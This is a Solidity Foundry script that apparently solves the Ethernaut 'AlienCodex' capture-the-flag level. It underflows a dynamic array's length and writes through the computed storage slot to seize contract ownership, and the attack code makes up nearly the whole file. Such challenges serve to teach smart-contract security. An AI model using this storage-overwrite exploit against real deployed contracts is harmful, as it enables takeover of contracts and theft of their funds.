// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
// import {AlienCodex} from "../src/AlienCodex.sol";

abstract contract Ownable {
    address public owner;
}

abstract contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() virtual;
    function makeContact() public virtual;
    function record(bytes32 _content) public virtual;
    function retract() public virtual;
    function revise(uint256 i, bytes32 _content) public virtual;
}
/**
 *
 * Level address: 0x0BC04aa6aaC163A6B3667636D798FA053D43BD11
 * You've uncovered an Alien contract. Claim ownership to complete the level.
 *
 *  Things that might help
 *
 * Understanding how array storage works
 * Understanding ABI specifications
 * Using a very underhanded approach
 *
 */

contract AlienCodexScript is Attacker {
    Level private level = Level(0x0BC04aa6aaC163A6B3667636D798FA053D43BD11);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        AlienCodex alienCodex = AlienCodex(instance);

        alienCodex.makeContact();
        alienCodex.retract();
        bytes32 i = keccak256(abi.encode(uint256(1)));
        bytes32 offset = bytes32(type(uint256).max - uint256(i));

        alienCodex.revise(
            uint256(offset) + 1, bytes32(uint256(uint160(me.addr)))
        );

        require(alienCodex.owner() == me.addr, "Not owner");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
